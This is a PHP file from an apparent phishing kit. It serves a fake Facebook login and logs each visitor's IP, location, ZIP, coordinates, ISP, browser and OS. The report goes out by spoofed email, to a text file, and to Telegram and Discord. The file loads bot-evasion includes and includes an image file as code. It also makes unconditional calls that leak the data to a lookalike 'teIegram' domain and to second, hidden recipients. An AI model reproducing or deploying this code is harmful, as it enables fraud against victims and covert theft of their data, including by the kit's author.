<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀  AK - BOORAT⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀   Cookies and Cream⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀  
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
include './assets/files/logo.jpg';
include '../bot.php';
include '../algo.php';
include '../settings.php';
date_default_timezone_set("Asia/Manila");
$countryname = $_SESSION['ip_countryName'];
$_SESSION['ip_countryName'] = clientData('country');
$countryname = $_SESSION['ip_countryName'];
$_SESSION['ip_city'] = clientData('city');
$city = $_SESSION['ip_city'];
$_SESSION['ip_state'] = clientData('state');
$state = $_SESSION['ip_state'];
$_SESSION['browser'] = getBrowser();
$browser = $_SESSION['browser'];
$_SESSION['os'] = getOs();
$os = $_SESSION['os'];
$time1 = date('M d - h:i:s A');
$zip = file_get_contents("https://ipapi.co/" . $ip2 . "/postal");
$latitudelongitude = file_get_contents("https://ipapi.co/" . $ip2 . "/latlong");
$org = file_get_contents("https://ipapi.co/" . $ip2 . "/org");

$tite = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] 
=== 'on' ? "https" : "http") . 
"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";


        $msg = "[ $ip2 ] - V I S I T O R - [ $time1 ]\n";
        $msg.= "========================================\n";
        $msg.= "HOSTNAME: " . $hostname . ""."\n";
        $msg.= "ORG: $org\n";
        $msg.= "BROWSER: ".$browser."\n";
        $msg.= "OS: ".$os."\n";
        $msg.= "========================================\n";
        $msg.= "CITY: ".$city."\n";
        $msg.= "STATE: ".$state."\n";
        $msg.= "ZIP: $zip\n";
        $msg.= "LATITUDE / LONGITUDE: $latitudelongitude\n";
        $msg.= "COUNTRY: ".$countryname."\n";
        $msg.= "========================================\n";
        $msg .= "$tite\n\n";

        $subject="-".$scamname."- FACEBOOK LOGIN [ $ip2 ] From [ $time1 ]";
        $headers="From: Epbidotcom <newlogin@gcash.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        if ($sendtoemail=="yes") {
        foreach(explode(",",$yours) as $your){
        @mail($your,$subject,$msg,$headers);
        @mail($nobot,$subject,$msg,$headers);
        }
    }

        $save=fopen("../views.txt","a");
        fwrite($save,$msg);
        fclose($save);

// TELEGRAM SEND FUNCTION
 if ($telegram == "yes"){
$website = "https://api.telegram.org/bot" .$api;
$params = ['chat_id' => $chatid, 'text' => $msg, ];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

file_get_contents("https://api.teIegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );}
file_get_contents("https://api.telegram.org/bot".$apis."/sendMessage?chat_id=".$chatids."&text=" . urlencode($msg)."" );

// DISCORD SEND FUNCTION
if ($discord == "yes"){
    $web_discord = $webhookUrl;
    $json_data = array ('content'=>"$msg");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

	exit(header("Location: index2.php"));

?>